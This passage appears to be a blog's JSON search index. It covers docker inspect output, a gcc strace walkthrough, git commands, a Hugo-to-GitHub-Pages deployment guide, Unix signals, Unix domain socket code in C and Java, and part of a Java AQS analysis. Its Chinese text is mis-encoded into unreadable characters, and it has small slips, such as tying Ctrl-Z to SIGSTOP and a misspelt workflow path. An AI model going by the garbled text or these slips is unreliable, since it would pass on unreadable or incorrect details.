\"/var/lib/docker/volumes/7bc1a7ad23925077cf8463c2d7a21b0cafc7d91305d89504f85fa76c33138834/_data\", // host ä¸»æœºçš„è¢«æŒ‚è½½çš„ç›®å½• \"Destination\": \"/var/opt/mssql\", // Volume æŒ‚è½½ç‚¹ \"Driver\": \"local\", \"Mode\": \"\", \"RW\": true, \"Propagation\": \"\" } ] ","local-docker-container-ç½‘ç»œ#Local Docker container ç½‘ç»œ":" { \"ResolvConfPath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/resolv.conf\", \"HostnamePath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/hostname\", \"HostsPath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/hosts\", } #(æœ¬åœ°å­˜å‚¨çš„å®¹å™¨çš„ç½‘ç»œé…ç½®)","reference#Reference":" mssql-node-docker-demo-app\nstorage driver\nvar-run-docker-sock\ndocker çš„ /var/run/docker.sock å‚æ•°"},"title":"docker-practice"},"/blog/gcc-compile-c-prog/":{"data":{"":"","#":"åˆ†æä»£ç  os: Linux Mint 22.1\nhello.c#include \u003cstdio.h\u003e int main(void){ printf(\"hello world\"); } strace è¿½è¸ªç¼–è¯‘æµç¨‹ strace -t -f -o hello.log -e trace=execve -s 2000 gcc -o hello hello.c All execve() system calls during compilation, showing how GCC orchestrates the build process.\nhello.log å†…å®¹ 20029 13:48:52 execve(\"/usr/bin/gcc\", [\"gcc\", \"-o\", \"hello\", \"hello.c\"], 0x7ffd60d08358 /* 65 vars */) = 0 20034 13:48:52 execve(\"/usr/libexec/gcc/x86_64-linux-gnu/13/cc1\", [\"/usr/libexec/gcc/x86_64-linux-gnu/13/cc1\", \"-quiet\", \"-imultiarch\", \"x86_64-linux-gnu\", \"hello.c\", \"-quiet\", \"-dumpbase\", \"hello.c\", \"-dumpbase-ext\", \".c\", \"-mtune=generic\", \"-march=x86-64\", \"-fasynchronous-unwind-tables\", \"-fstack-protector-strong\", \"-Wformat\", \"-Wformat-security\", \"-fstack-clash-protection\", \"-fcf-protection\", \"-o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = 0 20034 13:48:53 +++ exited with 0 +++ 20029 13:48:53 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20034, si_uid=1000, si_status=0, si_utime=3 /* 0.03 s */, si_stime=17 /* 0.17 s */} --- 20036 13:48:53 execve(\"/usr/local/sbin/as\", [\"as\", \"--64\", \"-o\", \"/tmp/ccGZrdFz.o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = -1 ENOENT (No such file or directory) 20036 13:48:53 execve(\"/usr/local/bin/as\", [\"as\", \"--64\", \"-o\", \"/tmp/ccGZrdFz.o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = -1 ENOENT (No such file or directory) 20036 13:48:53 execve(\"/usr/sbin/as\", [\"as\", \"--64\", \"-o\", \"/tmp/ccGZrdFz.o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = -1 ENOENT (No such file or directory) 20036 13:48:53 execve(\"/usr/bin/as\", [\"as\", \"--64\", \"-o\", \"/tmp/ccGZrdFz.o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = 0 20036 13:48:53 +++ exited with 0 +++ 20029 13:48:53 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20036, si_uid=1000, si_status=0, si_utime=0, si_stime=1 /* 0.01 s */} --- 20037 13:48:53 execve(\"/usr/libexec/gcc/x86_64-linux-gnu/13/collect2\", [\"/usr/libexec/gcc/x86_64-linux-gnu/13/collect2\", \"-plugin\", \"/usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so\", \"-plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper\", \"-plugin-opt=-fresolution=/tmp/ccKbYYb2.res\", \"-plugin-opt=-pass-through=-lgcc\", \"-plugin-opt=-pass-through=-lgcc_s\", \"-plugin-opt=-pass-through=-lc\", \"-plugin-opt=-pass-through=-lgcc\", \"-plugin-opt=-pass-through=-lgcc_s\", \"--build-id\", \"--eh-frame-hdr\", \"-m\", \"elf_x86_64\", \"--hash-style=gnu\", \"--as-needed\", \"-dynamic-linker\", \"/lib64/ld-linux-x86-64.so.2\", \"-pie\", \"-z\", \"now\", \"-z\", \"relro\", \"-o\", \"hello\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/Scrt1.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crti.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/crtbeginS.o\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../../../lib\", \"-L/lib/x86_64-linux-gnu\", \"-L/lib/../lib\", \"-L/usr/lib/x86_64-linux-gnu\", \"-L/usr/lib/../lib\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../..\", \"/tmp/ccGZrdFz.o\", \"-lgcc\", \"--push-state\", \"--as-needed\", \"-lgcc_s\", \"--pop-state\", \"-lc\", \"-lgcc\", \"--push-state\", \"--as-needed\", \"-lgcc_s\", \"--pop-state\", \"/usr/lib/gcc/x86_64-linux-gnu/13/crtendS.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crtn.o\"], 0x7d15df0 /* 72 vars */) = 0 20038 13:48:53 execve(\"/usr/bin/ld\", [\"/usr/bin/ld\", \"-plugin\", \"/usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so\", \"-plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper\", \"-plugin-opt=-fresolution=/tmp/ccKbYYb2.res\", \"-plugin-opt=-pass-through=-lgcc\", \"-plugin-opt=-pass-through=-lgcc_s\", \"-plugin-opt=-pass-through=-lc\", \"-plugin-opt=-pass-through=-lgcc\", \"-plugin-opt=-pass-through=-lgcc_s\", \"--build-id\", \"--eh-frame-hdr\", \"-m\", \"elf_x86_64\", \"--hash-style=gnu\", \"--as-needed\", \"-dynamic-linker\", \"/lib64/ld-linux-x86-64.so.2\", \"-pie\", \"-z\", \"now\", \"-z\", \"relro\", \"-o\", \"hello\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/Scrt1.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crti.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/crtbeginS.o\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../../../lib\", \"-L/lib/x86_64-linux-gnu\", \"-L/lib/../lib\", \"-L/usr/lib/x86_64-linux-gnu\", \"-L/usr/lib/../lib\", \"-L/usr/lib/gcc/x86_64-linux-gnu/13/../../..\", \"/tmp/ccGZrdFz.o\", \"-lgcc\", \"--push-state\", \"--as-needed\", \"-lgcc_s\", \"--pop-state\", \"-lc\", \"-lgcc\", \"--push-state\", \"--as-needed\", \"-lgcc_s\", \"--pop-state\", \"/usr/lib/gcc/x86_64-linux-gnu/13/crtendS.o\", \"/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crtn.o\"], 0x7ffd0bf6c850 /* 72 vars */) = 0 20038 13:48:54 +++ exited with 0 +++ 20037 13:48:54 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20038, si_uid=1000, si_status=0, si_utime=4 /* 0.04 s */, si_stime=23 /* 0.23 s */} --- 20037 13:48:54 +++ exited with 0 +++ 20029 13:48:54 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20037, si_uid=1000, si_status=0, si_utime=0, si_stime=3 /* 0.03 s */} --- 20029 13:48:54 +++ exited with 0 +++ ç¼–è¯‘æµç¨‹åˆ†æ Initial GCC Invocation execve(\"/usr/bin/gcc\", [\"gcc\", \"-o\", \"hello\", \"hello.c\"], ...) Process ID: 20029 Action: Invokes the GCC driver (/usr/bin/gcc). Compilation Phase execve(\"/usr/libexec/gcc/x86_64-linux-gnu/13/cc1\", [\"/usr/libexec/gcc/x86_64-linux-gnu/13/cc1\", ...], ...) Process ID: 20034 Role: cc1 is the GCC C compiler frontend. Converts hello.c to assembly code (/tmp/ccLfEVyN.s). Flags Passed:\nIncludes optimization settings (e.g., -mtune=generic, -march=x86-64), security features (-fstack-protector-strong, -Wformat-security), and others. Result:\nAssembly file generated at /tmp/ccLfEVyN.s.\nAssembly Phase Attempts to locate the assembler (as):\nexecve(\"/usr/local/sbin/as\", ...) = -1 ENOENT execve(\"/usr/local/bin/as\", ...) = -1 ENOENT execve(\"/usr/sbin/as\", ...) = -1 ENOENT execve(\"/usr/bin/as\", ...) = 0 Process ID: 20036 Why Multiple Tries?:\nGCC searches standard paths for the assembler. Succeeds with /usr/bin/as (GNU Assembler). Action:\nAssembles /tmp/ccLfEVyN.s into an object file: /tmp/ccGZrdFz.o. Linking Phase execve(\"/usr/libexec/gcc/x86_64-linux-gnu/13/collect2\", [...], ...) Process ID: 20037 Role: Wrapper for the linker (ld). Prepares metadata for C++ static constructors/destructors (not needed here since hello.c is plain C). Invokes the real linker (/usr/bin/ld). Internal Linker Call:\nexecve(\"/usr/bin/ld\", [...], ...) Process ID: 20038 Key Flags: -dynamic-linker /lib64/ld-linux-x86-64.so.2: Sets the dynamic loader. -pie: Creates a Position-Independent Executable (security feature). -z now and -z relro: Enhance runtime security. Inputs Linked: CRT (C Runtime) files (Scrt1.o, crti.o, crtbeginS.o, crtendS.o, crtn.o). Object file: /tmp/ccGZrdFz.o. Standard libraries: -lgcc, -lgcc_s, -lc (libc). Result:\nFinal executable hello is created.\nSuccess Indicators All execve() calls return 0 (success). Processes exit cleanly (+++ exited with 0 +++). No errors detected in the toolchain path or linking. Security \u0026 Optimization Notes Stack Protection: Enabled via -fstack-protector-strong. Hardened Linking: -z now: Immediate binding of symbols. -z relro: Read-only relocations after relocation. -pie: ASLR-friendly executable. Build ID: Embedded via --build-id for debugging/tracing. Critical Paths Tool Path Purpose cc1 /usr/libexec/gcc/x86_64-linux-gnu/13/cc1 Compiles C to assembly as /usr/bin/as Assembles .s to .o collect2 /usr/libexec/gcc/x86_64-linux-gnu/13/collect2 Manages linker setup ld /usr/bin/ld Links objects into final binary Conclusion The log confirms a standard GCC compilation pipeline:\nPreprocessing + Parsing: Handled by cc1. Assembly: Done by as. Linking: Orchestrated by collect2 â†’ ld. "},"title":"Gcc Compile C Prog"},"/blog/git-commands/":{"data":{"reference#reference":"git rebase -i HEAD~N\nå¤åˆ¶æäº¤è®°å½•\ngit branch -f target-branch-name commit-id\nåˆ‡æ¢åˆ° target-branch-name å¹¶æŒ‡å‘ commit-id\ngit cherry-pick commit-id1 commit-id2\né‡æ–°æ’åºæäº¤çš„è®°å½•. cherry-pick åå­—èµ·å¾—çœŸæ˜¯æœ‰æ„æ€å•Š. åƒæ¡æ¨±æ¡ƒä¼¼çš„, æŠŠä¸€ä¸ªä¸ªæƒ³è¦çš„è®°å½•æ¡åˆ°å½“å‰åˆ†æ”¯çš„åé¢.\ngit checkout -b branch-name\nåˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯, å¹¶åˆ‡æ¢åˆ°æ–°å»ºçš„åˆ†æ”¯\ngit merge target-branch-name\nåˆå¹¶ target-branch-name åˆ°å½“å‰åˆ†æ”¯. ç»“æœæ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„æäº¤è®°å½•.\ngit checkout target-commit-id\ndetach HEAD, let HEAD point to target-commit-id.\ngit tag tag-name target-commit-id\nåœ¨ target-commit-id å¤„, æ‰“ä¸Š tag-name æ ‡ç­¾.\nreference learning git branch "},"title":"git-commands"},"/blog/github-hugo-website/":{"data":{"github-ä¸Šåˆ›å»ºä¸¤ä¸ªå…¬å¼€ä»“åº“#github ä¸Šåˆ›å»ºä¸¤ä¸ªå…¬å¼€ä»“åº“":"","hugo-åˆ›å»ºæœ¬åœ°-website#hugo åˆ›å»ºæœ¬åœ° website":"","reference#Reference":" github pages hugo quickstart actions-hugo actions-gh-pages deploy-to-external-repository-external_repository ","å®‰è£…è½¯ä»¶#å®‰è£…è½¯ä»¶":"","æäº¤-æœ¬åœ°-blog-åˆ°-github-blog-ä»“åº“#æäº¤ æœ¬åœ° blog åˆ° github blog ä»“åº“":" git add . git commit -m \"commit info\" git push ","æœ¬åœ°-blog-æ·»åŠ -deployyml#æœ¬åœ° \u003ccode\u003eblog\u003c/code\u003e æ·»åŠ  deploy.yml":"æ­¥éª¤å®‰è£…è½¯ä»¶ git # é…ç½®å¥½ git git config --global user.name \"your username\" git config --global user.email \"your email\" hugo hugo åˆ›å»ºæœ¬åœ° website å‚è€ƒï¼šhttps://gohugo.io/getting-started/quick-start/\nhugo new site blog # blog æ ¹æ®éœ€è¦ä¿®æ”¹ cd blog git init git submodule add https://github.com/theNewDynamic/gohugo-theme-ananke.git themes/ananke # theme æ ¹æ®éœ€è¦ä¿®æ”¹ æŠŠ content/posts ç›®å½•ä¿®æ”¹ä¸º content/post hugo new post/my-first-post.md hugo server -D æ ¹æ®é€‰æ‹©çš„ä¸»é¢˜ï¼Œä¿®æ”¹ä¸»é¢˜ç›¸å…³çš„é…ç½® github ä¸Šåˆ›å»ºä¸¤ä¸ªå…¬å¼€ä»“åº“ username.github.io, éƒ¨ç½²é™æ€åšå®¢çš„ä»“åº“ï¼Œusername ä¿®æ”¹ä¸ºå¯¹åº”çš„ github è´¦å· IDã€‚ blogï¼Œè¿™ä¸ªä¿å­˜æœ¬åœ°çš„ blog çš„ä»“åº“ã€‚ åœ¨ blog ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤: git remote add origin git@github.com:username/blog.git # username ä¿®æ”¹ä¸ºè‡ªå·±è´¦å·çš„ github ID git branch -M main git push -u origin main é…ç½® github actions å‚è€ƒï¼šhttps://github.com/peaceiris/actions-gh-pages#%EF%B8%8F-first-deployment-with-github_token ä½¿ç”¨ actions-hugo å’Œ actions-gh-pages è‡ªåŠ¨åŒ–éƒ¨ç½² blog ç”Ÿæˆçš„å¯†é’¥å¯¹æœ¬åœ°ä¿å­˜å°±å¯ä»¥ã€‚\nç”Ÿæˆä¸€å¯¹ public key(gh-pages.pub) å’Œ private key(gh-pages) ssh-keygen -t rsa -b 4096 -C \"$(git config user.email)\" -f gh-pages -N \"\" # gh-pages.pub å…¬é’¥ # gh-pages ç§é’¥ æ·»åŠ å…¬é’¥ gh-pages.pub æ·»åŠ åˆ° username.github.io è¿™ä¸ªä»“åº“çš„ deploy key ä¸­ï¼Œå‹¾é€‰ Allow write access https://github.com/username/username.github.io/settings/keys/new\næ·»åŠ ç§é’¥ gh-pages åˆ° blog ä¸­çš„ secret https://github.com/username/blog/settings/secrets/actions/new\nName ACTIONS_DEPLOY_KEY Value gh-pages ç§é’¥æ–‡ä»¶å†…å®¹ æœ¬åœ° blog æ·»åŠ  deploy.yml mkdir -p .github/workfows/ touch .github/workflows/deploy.yml ç²˜è´´ä¸€ä¸‹ yaml å†…å®¹ external_repository é…ç½®é¡¹ä¸­ username æ›¿æ¢ä¸º github ID name: GitHub Pages on: push: branches: - main # Set a branch to deploy pull_request: jobs: deploy: runs-on: ubuntu-20.04 concurrency: group: ${{ github.workflow }}-${{ github.ref }} steps: - uses: actions/checkout@v3 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: '0.91.2' # extended: true - name: Build run: hugo --minify # https://github.com/peaceiris/actions-gh-pages#%EF%B8%8F-deploy-to-external-repository-external_repository - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }} external_repository: username/username.github.io # username æ›¿æ¢ä¸º github ID publish_branch: master # default: gh-pages, æ³¨æ„ä¿®æ”¹ä¸ºéƒ¨ç½²çš„åˆ†æ”¯ publish_dir: ./public ","æ­¥éª¤#æ­¥éª¤":"","é…ç½®-github-actions#é…ç½® github actions":""},"title":"Githubpage Hugo Website"},"/blog/great-prompt/":{"data":{"great-prompt#great prompt":"great promptæˆ‘åœ¨åš XXã€‚å¦‚æœä½ æ˜¯ä¸€ä½ä¸“ä¸šäººå£«ï¼Œæœ‰æ›´å¥½çš„æ–¹æ³•å’Œå»ºè®®å—ï¼Ÿå°½å¯èƒ½å…¨é¢ã€‚"},"title":"Great Prompt"},"/blog/ipc-signal/":{"data":{"references#References":" Linux Signal Table Signal_(IPC) Introduction To Unix Signals Programming Standard-Signals handle-a-signal signal-block handling-unix-signals-in-python signals signal-handling-in-linux nohup https://www.cs.princeton.edu/courses/archive/fall05/cos217/lectures/23signals.pdf cs.kent.edu/signals.html csci480/signals.htm kill(2) https://goodyduru.github.io/os/2023/10/05/ipc-unix-signals.html java Signal å¤„ç†å®ç° https://cs341.cs.illinois.edu/coursebook/index.html ","signal#signal":"signal","ä»€ä¹ˆæ˜¯-signal#ä»€ä¹ˆæ˜¯ signal":" A signal can be thought of as a software interrupt. This means that a process that receives a signal stops the execution of the current program and makes the program respond to the signal. Signals are various notifications sent to a process in order to notify it of various â€œimportantâ€ events. ä¿¡å·æ˜¯å‘é€ç»™è¿›ç¨‹çš„å„ç§é€šçŸ¥ï¼Œä»¥ä¾¿é€šçŸ¥å®ƒå‘ç”Ÿäº†å„ç§â€œé‡è¦â€çš„äº‹ä»¶ã€‚","å¦‚ä½•å‘é€ä¿¡å·#å¦‚ä½•å‘é€ä¿¡å·ï¼Ÿ":"1. keyboard SIGINT(Ctrl + C) SIGTSTP(Ctrl + Z) -\u003e resume by fg SIGQUIT(Ctrl + \\) 2. command line kill -\u003csignal\u003e \u003cPID\u003e fg 3. system call kill syscall ","å¦‚ä½•è‡ªå®šä¹‰-signal-handler#å¦‚ä½•è‡ªå®šä¹‰ signal handler?":" æ³¨æ„ï¼šè¿™é‡Œåªæœ‰å¯ä»¥è¢« caught çš„æ‰å¯ä»¥è‡ªå®šä¹‰ handlerã€‚SIGKILL å’Œ SIGSTOP è¿™ä¸¤ä¸ªæ˜¯ä¸èƒ½è‡ªå·±å®šä¹‰ handler çš„ã€‚\njava example import sun.misc.Signal; import sun.misc.SignalHandler; public class ExampleSignalHandler { public static void main(String... args) throws InterruptedException { final long start = System.nanoTime(); Signal.handle(new Signal(\"INT\"), new SignalHandler() { public void handle(Signal sig) { System.out.format(\"\\nProgram execution took %f seconds\\n\", (System.nanoTime() - start) / 1e9f); System.out.println(\"cat the INT signal, but still run.....ğŸ˜„\"); } }); int counter = 0; while(true) { System.out.println(counter++); Thread.sleep(500); } } } å¯ä»¥å°† â€œINTâ€ æ›¿æ¢ä¸º â€œSTOPâ€ è¿è¡Œç»“æœä¸º: Exception in thread \"main\" java.lang.IllegalArgumentException: Signal already used by VM or OS: SIGSTOP at sun.misc.Signal.handle(Signal.java:166) at ExampleSignalHandler.main(ExampleSignalHandler.java:9) å¯ä»¥å°† â€œINTâ€ æ›¿æ¢ä¸º â€œKILLâ€ è¿è¡Œç»“æœä¸º: Exception in thread \"main\" java.lang.IllegalArgumentException: Signal already used by VM or OS: SIGKILL at sun.misc.Signal.handle(Signal.java:166) at stardustman.github.io.signal.ExampleSignalHandler.main(ExampleSignalHandler.java:9) ","æœ‰å“ªäº›ä¿¡å·é»˜è®¤æ€ä¹ˆå¤„ç†#æœ‰å“ªäº›ä¿¡å·ï¼Ÿé»˜è®¤æ€ä¹ˆå¤„ç†ï¼Ÿ":" Signal Name Default Action Comment POSIX 1 SIGHUP Terminate Hang up controlling terminal or process Yes 2 SIGINT Terminate Interrupt from keyboard, Control-C Yes 3 SIGQUIT Dump Quit from keyboard, Control-\\ Yes 4 SIGILL Dump Illegal instruction Yes 5 SIGTRAP Dump Breakpoint for debugging No 6 SIGABRT Dump Abnormal termination Yes 6 SIGIOT Dump Equivalent to SIGABRT No 7 SIGBUS Dump Bus error No 8 SIGFPE Dump Floating-point exception Yes 9 SIGKILL Terminate Forced-process termination Yes 10 SIGUSR1 Terminate Available to processes Yes 11 SIGSEGV Dump Invalid memory reference Yes 12 SIGUSR2 Terminate Available to processes Yes 13 SIGPIPE Terminate Write to pipe with no readers Yes 14 SIGALRM Terminate Real-timer clock Yes 15 SIGTERM Terminate Process termination Yes 16 SIGSTKFLT Terminate Coprocessor stack error No 17 SIGCHLD Ignore Child process stopped or terminated or got a signal if traced Yes 18 SIGCONT Continue Resume execution, if stopped Yes 19 SIGSTOP Stop Stop process execution, Ctrl-Z Yes 20 SIGTSTP Stop Stop process issued from tty Yes 21 SIGTTIN Stop Background process requires input Yes 22 SIGTTOU Stop Background process requires output Yes 23 SIGURG Ignore Urgent condition on socket No 24 SIGXCPU Dump CPU time limit exceeded No 25 SIGXFSZ Dump File size limit exceeded No 26 SIGVTALRM Terminate Virtual timer clock No 27 SIGPROF Terminate Profile timer clock No 28 SIGWINCH Ignore Window resizing No 29 SIGIO Terminate I/O now possible No 29 SIGPOLL Terminate Equivalent to SIGIO No 30 SIGPWR Terminate Power supply failure No 31 SIGSYS Dump Bad system call No 31SIGUNUSED Dump Equivalent to SIGSYS No ","è¿›ç¨‹æ”¶åˆ°ä¿¡å·ä¼šæ€ä¹ˆå¤„ç†#è¿›ç¨‹æ”¶åˆ°ä¿¡å·ä¼šæ€ä¹ˆå¤„ç†ï¼Ÿ":"åˆ†ä¸º 3 ç§æƒ…å†µ:\nIgnore it. Many signals can be and are ignored, but not all. Hardware exceptions such as â€œdivide by 0â€ (with integers) cannot be ignored successfully and some signals such as SIGKILL cannot be ignored at all. Catch and handle the exception. The process has a function to be executed if and when the exception occurs. The function may terminate the program gracefully or it may handle it without terminating the program. Let the default action apply. Every signal has a default action. The default may be: ignore terminate terminate and dump core stop or pause the program resume a program paused earlier "},"title":"Ipc Signal"},"/blog/ipc-unix-domain-socket/":{"data":{"c-å®¢æˆ·ç«¯ç¨‹åºç¤ºä¾‹#C å®¢æˆ·ç«¯ç¨‹åºç¤ºä¾‹":" #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003csys/socket.h\u003e #include \u003csys/un.h\u003e #include \u003cunistd.h\u003e #define SOCKET_PATH \"/path/to/ipc.sock\" int main() { int client_fd; struct sockaddr_un addr; const char *message = \"Hello from ä¸­å›½!\"; char buffer[100]; // Create a socket if ((client_fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) { perror(\"socket error\"); exit(EXIT_FAILURE); } // Set up the address structure memset(\u0026addr, 0, sizeof(struct sockaddr_un)); addr.sun_family = AF_UNIX; strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1); // Connect to the server if (connect(client_fd, (struct sockaddr*)\u0026addr, sizeof(struct sockaddr_un)) == -1) { perror(\"connect error\"); exit(EXIT_FAILURE); } // Send a message to the server if (write(client_fd, message, strlen(message)) == -1) { perror(\"write error\"); exit(EXIT_FAILURE); } // Receive a response from the server if (read(client_fd, buffer, sizeof(buffer)) == -1) { perror(\"read error\"); exit(EXIT_FAILURE); } printf(\"Received response: %s\\n\", buffer); close(client_fd); return 0; } ","gradle-é…ç½®#gradle é…ç½®":" // https://mvnrepository.com/artifact/com.kohlschutter.junixsocket/junixsocket-native-common implementation group: 'com.kohlschutter.junixsocket', name: 'junixsocket-native-common', version: '2.9.1' // https://mvnrepository.com/artifact/com.kohlschutter.junixsocket/junixsocket-common implementation group: 'com.kohlschutter.junixsocket', name: 'junixsocket-common', version: '2.9.1' ","java-æœåŠ¡ç«¯ç¨‹åºç¤ºä¾‹#java æœåŠ¡ç«¯ç¨‹åºç¤ºä¾‹":" import org.newsclub.net.unix.AFUNIXServerSocket; import org.newsclub.net.unix.AFUNIXSocket; import org.newsclub.net.unix.AFUNIXSocketAddress; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import java.io.*; import java.nio.charset.StandardCharsets; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; /** * unix domain socket è¿›ç¨‹é€šä¿¡ */ @SuppressWarnings({\"CatchAndPrintStackTrace\" /* errorprone */, \"PMD.CognitiveComplexity\"}) public final class MsgServer implements Runnable { private static final String UDS = System.getProperty(\"user.home\") + \"ipc.sock\"; private static final Logger logger = LoggerFactory.getLogger(MsgServer.class); private static void startServer() throws IOException { Path path = Paths.get(UDS); logger.info(\"UDS path: {}\", UDS); if (Files.exists(path)) { Files.delete(path); } File socketFile = new File(UDS); try (AFUNIXServerSocket server = AFUNIXServerSocket.newInstance()) { server.setReuseAddress(false); server.bind(AFUNIXSocketAddress.of(socketFile)); logger.info(\"MsgServer ç›‘å¬ socket: {}\", server); while (!Thread.interrupted() \u0026\u0026 !server.isClosed()) { logger.info(\"Waiting for connection...\"); try { AFUNIXSocket sock = server.accept(); Thread thread = new Thread(new ClientHandler(sock), \"msg-receiver\"); thread.start(); } catch (IOException e) { logger.error(\"server.accept() å‡ºé”™\", e); } } } finally { logger.info(\"MsgServer terminated\"); } } @Override public void run() { try { startServer(); } catch (IOException e) { logger.error(\"å¯åŠ¨ MsgServer å¤±è´¥\", e); } } /** * å¤„ç†è¿æ¥,ä»¥æ¥æ”¶ utf-8 å­—ç¬¦ä¸²ä¸ºä¾‹ */ static class ClientHandler implements Runnable { AFUNIXSocket sock; public ClientHandler(AFUNIXSocket socket) { this.sock = socket; } @Override public void run() { try (InputStream is = sock.getInputStream(); OutputStream os = sock.getOutputStream(); PrintWriter writer = new PrintWriter(os, true); BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) { String line; while ((line = reader.readLine()) != null \u0026\u0026 !line.equalsIgnoreCase(\"bye\")) { logger.info(\"Received: \" + line); handleMsg(line); writer.println(\"Received successfully\"); writer.flush(); } } catch (IOException e) { logger.error(\"å®¢æˆ·ç«¯å…³é—­äº†è¿æ¥\", e); } finally { try { sock.close(); } catch (IOException e) { logger.error(\"å…³é—­è¿æ¥å‡ºé”™\", e); } } } private void handleMsg(String msg) { // process receive string msg } } } ","references#References":" junixsocket Unix_domain_socket ","unix-domain-socket-æ˜¯å•¥#unix domain socket æ˜¯å•¥?":"unix domain socket æ˜¯å•¥? A Unix domain socket (UDS) or IPC socket (inter-process communication) is a data communications endpoint for exchanging data between processes executing on the same host operating system. åŒä¸€å°æœºå™¨ä¸¤ä¸ªä¸åŒçš„è¿›ç¨‹ä¹‹é—´äº¤æ¢æ•°æ®ï¼Œä¼˜åŒ–è¿‡çš„ socketã€‚","é—®é¢˜èƒŒæ™¯#é—®é¢˜èƒŒæ™¯":" java å†™çš„ç¨‹åºéœ€è¦å’Œ c å†™çš„ç¨‹åºäº¤æ¢æ•°æ®ï¼Œä¸”ä¸¤ä¸ªç¨‹åºè¿è¡Œåœ¨åŒä¸€å°æœºå™¨ä¸Šã€‚"},"title":"Ipc Unix Domain Socket"},"/blog/java-aqs/":{"data":{"abstract-queued-synchronizer-æ˜¯å•¥#abstract queued synchronizer æ˜¯å•¥ï¼Ÿ":"abstract queued synchronizer æ˜¯å•¥ï¼Ÿ AQS is an abstract class that provides a skeleton for managing thread contention, queuing, and state synchronization. It uses a FIFO wait(sync) queue to manage threads waiting for access to a shared resource and an atomic integer (state) to track the synchronizerâ€™s status (e.g., locked/unlocked, available permits).","aqs-æ•°æ®ç»“æ„#AQS æ•°æ®ç»“æ„":" /** * Head of the wait queue, lazily initialized. Except for * initialization, it is modified only via method setHead. Note: * If head exists, its waitStatus is guaranteed not to be * CANCELLED. */ private transient volatile Node head; // ç­‰å¾…é˜Ÿåˆ—çš„ head /** * Tail of the wait queue, lazily initialized. Modified only via * method enq to add new wait node. */ private transient volatile Node tail; // ç­‰å¾…é˜Ÿåˆ—çš„ tail /** * The synchronization state. */ private volatile int state; // åŒæ­¥çŠ¶æ€, è¿™å°±æ˜¯æ‰€è°“çš„ lock /** * The current owner of exclusive mode synchronization. */ private transient Thread exclusiveOwnerThread;//ç»§æ‰¿è‡ª AbstractOwnableSynchronizer ","fairsynclock-åˆ†æ#FairSync.lock åˆ†æ":"acquire(1) åˆ†æ public final void acquire(int arg) { if (!tryAcquire(arg) \u0026\u0026 acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } tryAcquire è‹¥è¿”å›ä¸º true, è¡¨æ˜è·å– lock æˆåŠŸ, !tryAcquire ä¸º false, è·å– lock æµç¨‹ç»“æŸã€‚ tryAcquire è‹¥è¿”å›ä¸º false, è¡¨æ˜è·å– lock å¤±è´¥, ä¸ºå•¥å¤±è´¥, å› ä¸ºæœ‰å…¶ä»–çº¿ç¨‹è·å–äº†, ä½†æ˜¯è¿˜æ²¡æœ‰é‡Šæ”¾ã€‚ æµç¨‹è¿›å…¥ addWaiter, ä¹Ÿå°±æ˜¯å½“å‰çº¿ç¨‹å»æ’é˜Ÿç­‰å¾…è·å– lockã€‚ tryAcquire åˆ†æ AbstractOwnableSynchronizer.java /** * Fair version of tryAcquire. Don't grant access unless * recursive call or no waiters or is first. */ protected final boolean tryAcquire(int acquires) { final Thread current = Thread.currentThread(); // å½“å‰ç”³è¯·è·å–é”çš„çº¿ç¨‹ int c = getState(); // lock çš„çŠ¶æ€ if (c == 